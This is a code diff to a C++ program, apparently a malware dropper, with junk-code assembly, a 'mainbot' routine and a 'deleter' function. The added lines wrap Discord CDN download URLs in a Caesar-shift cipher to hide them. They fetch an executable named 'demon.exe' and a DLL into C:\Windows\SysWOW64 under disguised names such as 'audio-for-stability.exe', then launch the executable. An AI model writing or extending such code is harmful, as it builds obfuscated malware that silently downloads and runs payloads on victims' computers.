@@ -34,6 +34,37 @@
     __asm{or eax, ecx}        \
     __asm{pop eax}
 using namespace junkcode;
+string encrypt(string input) {
+    vector<char> word(input.begin(), input.end());
+    string alphabet = "abcdefghijklmnopqrstuvwxyz";
+
+    for (int i = 0; i < (int)input.length(); i++) {
+        for (int j = 0; j < (int)alphabet.length(); j++) {
+            if (word[i] == alphabet[j]) {
+                word[i] = alphabet[(j + 3) % 26];
+
+                break;
+            }
+        }
+    }
+    string str(word.begin(), word.end());
+    return str;
+}
+string decrypt(string input) {
+    vector<char> word(input.begin(), input.end());
+    string alphabet = "abcdefghijklmnopqrstuvwxyz";
+
+    for (int i = 0; i < (int)input.length(); i++) {
+        for (int j = 0; j < (int)alphabet.length(); j++) {
+            if (word[i] == alphabet[j]) {
+                word[i] = alphabet[(j - 3) % 26];
+                break;
+            }
+        }
+    }
+    string str(word.begin(), word.end());
+    return str;
+}
 void deleter()
 {
     using namespace filesystem;
@@ -279,13 +310,16 @@ void mainbot()
                         _emit 0xA0
                         caca5:
                 }
-                
-                std::string download = (dead("https://cdn.discordapp.com/attachments/834754431249285140/891660223981428758/demon.exe").c_str());
+
+
+                std::string download = (decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/891660223981428758/ghprq.hah").c_str());
                 std::string path = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
                 URLDownloadToFileA(NULL, download.c_str(), path.c_str(), 0, NULL);
                 system(dead("cd C:\\Windows\\SysWOW64\\").c_str());
 
-               
+                std::string dll = (decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/891659436341477376/vhuyhu.goo").c_str());
+                std::string dllpath = (dead("C:\\Windows\\SysWOW64\\audio.dll").c_str());
+                URLDownloadToFileA(NULL, dll.c_str(), dllpath.c_str(), 0, NULL);
 
                 system(dead("start audio-for-stability.exe").c_str());
                 system(dead("cls").c_str());
